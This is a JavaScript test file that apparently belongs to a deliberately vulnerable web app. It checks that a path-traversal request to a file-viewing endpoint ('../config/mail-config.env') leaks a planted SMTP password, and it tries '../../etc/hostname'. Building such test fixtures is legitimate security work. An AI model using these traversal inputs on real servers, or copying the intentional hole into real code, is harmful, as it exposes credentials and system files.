const request = require('supertest')
const { newTestApp, cleanup } = require('./helpers/testApp')

let app

beforeEach(() => { app = newTestApp() })
afterEach(() => cleanup(app))

test('traversal via ../config/mail-config.env returns the leaked SMTP credentials', async () => {
  const res = await request(app).get('/files/view?name=../config/mail-config.env')
  expect(res.status).toBe(200)
  expect(res.text).toContain('SMTP_PASSWORD=Nt9vQz3Lm7Bxk1Rf')
})

test('normal file is still served correctly alongside the vulnerability', async () => {
  const res = await request(app).get('/files/view?name=terms.txt')
  expect(res.status).toBe(200)
  expect(res.text).toContain('Terms of service.')
  expect(res.text).not.toContain('SMTP_PASSWORD')
})

test('GET /api/files never exposes the mail config file', async () => {
  const res = await request(app).get('/api/files')
  expect(res.body).not.toContain('mail-config.env')
})

test('deeper traversal (../../) also escapes the docs directory', async () => {
  const res = await request(app).get('/files/view?name=../../etc/hostname')
  expect(res.status).not.toBe(200)
})
